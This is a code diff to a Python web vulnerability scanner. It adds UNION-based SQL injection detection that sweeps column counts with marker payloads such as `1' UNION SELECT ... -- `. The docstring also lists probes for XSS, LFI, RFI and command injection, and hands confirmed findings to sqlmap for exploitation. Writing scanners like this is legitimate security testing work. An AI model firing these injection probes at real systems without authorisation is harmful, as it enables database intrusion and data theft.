@@ -7,17 +7,23 @@ that are then promoted to safe_validator for confirmation and, for SQLi, to
 sqlmap_runner for deep exploitation.
 
 Coverage:
-  * SQLi  — error-based, boolean-blind, time-based blind
+  * SQLi  — error-based, boolean-blind, UNION-based, time-based blind
   * XSS   — reflected (execution-aware, escaping-resistant FP filter)
   * LFI   — path traversal + php:// wrappers, content-leak confirmed (CWE-98)
   * RFI   — best-effort remote-fetch attempt detection (CWE-98)
   * CmdI  — output-based (`id`/echo) + time-based blind (CWE-78)
 
-Three SQLi detection techniques:
+Four SQLi detection techniques:
   1. Error-based  — trigger DBMS error messages (fast, reliable when errors shown)
   2. Boolean-based — compare true/false condition responses (catches hidden SQLi)
-  3. Time-based blind — measure SLEEP()/WAITFOR DELAY response time differential
+  3. UNION-based  — exfiltrate a unique marker via `UNION SELECT` (proves data
+     read-out; column count is swept and the check is reflection-resistant)
+  4. Time-based blind — measure SLEEP()/WAITFOR DELAY response time differential
      (catches fully blind SQLi where neither errors nor data differences are visible)
+
+Every output-based check (SQLi boolean/union, CmdI echo marker) strips the
+reflected payload before matching, so a page that merely echoes input is never
+mistaken for genuine execution.
 """
 
 from __future__ import annotations
@@ -92,6 +98,12 @@ SQLI_TIME_PROBES: list[tuple[str, int, str]] = [
 
 # Time differential threshold: response must be >= (sleep - 0.5) seconds
 _TIME_THRESHOLD_FACTOR = 0.85
+
+# UNION-based SQLi: a unique marker exfiltrated through `UNION SELECT`. Detection
+# is high-confidence (the marker only appears if our injected SELECT executed and
+# a column was rendered) and reflection-resistant (see _test_sqli_union_param).
+_UNION_MARK = "h3av3nun10n"
+SQLI_UNION_MAX_COLS = 6
 
 # DB error signatures (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
 SQLI_ERROR_PATTERNS: list[re.Pattern] = [
@@ -544,6 +556,50 @@ class InjectionScanner:
                 )
                 return
 
+    async def _test_sqli_union_param(self, session, url: str, param: str,
+                                     baseline_body: str) -> None:
+        """UNION-based SQLi: exfiltrate a unique marker via ``UNION SELECT``.
+
+        The column count is unknown, so we sweep 1..N and try both a
+        string-quote-close and a numeric context; the marker is placed in every
+        selected column so any displayed column leaks it. Reflection-resistant:
+        the marker lives inside the payload, so we strip the reflected payload
+        before checking — the marker only counts when it surfaces as query
+        OUTPUT (a rendered row), never as a verbatim echo of the input.
+        """
+        if _UNION_MARK in baseline_body:
+            return  # marker already present — can't use it as a signal here
+        for ncols in range(1, SQLI_UNION_MAX_COLS + 1):
+            cols = ",".join([f"'{_UNION_MARK}'"] * ncols)
+            for prefix in ("1' UNION SELECT ", "1 UNION SELECT "):
+                payload = f"{prefix}{cols} -- "
+                injected_url = _inject_param(url, param, payload)
+                async with self._sem:
+                    if self._delay:
+                        await asyncio.sleep(self._delay)
+                    _, body = await _get(session, injected_url, self._headers)
+                if not body:
+                    continue
+                if _UNION_MARK in _strip_reflection(body, payload):
+                    self._add_finding(
+                        target=injected_url,
+                        vuln_type="sqli",
+                        title=f"SQL Injection (UNION-based) — param '{param}'",
+                        severity="critical",
+                        confidence=0.9,
+                        evidence={
+                            "param": param,
+                            "payload": payload,
+                            "technique": "union",
+                            "columns": ncols,
+                            "marker": _UNION_MARK,
+                            "url": url,
+                        },
+                        remediation="Use parameterised queries / prepared statements.",
+                        cwe="CWE-89",
+                    )
+                    return
+
     async def _test_sqli_time_param(self, session, url: str, param: str) -> None:
         """Time-based blind SQLi: inject SLEEP/WAITFOR and measure response time.
 
@@ -880,6 +936,7 @@ class InjectionScanner:
             for param in qs:
                 tasks.append(self._test_sqli_param(session, url, param, baseline))
                 tasks.append(self._test_sqli_boolean_param(session, url, param, baseline))
+                tasks.append(self._test_sqli_union_param(session, url, param, baseline))
                 tasks.append(self._test_sqli_time_param(session, url, param))
                 tasks.append(self._test_xss_param(session, url, param))
                 tasks.append(self._test_inclusion_param(session, url, param, baseline))
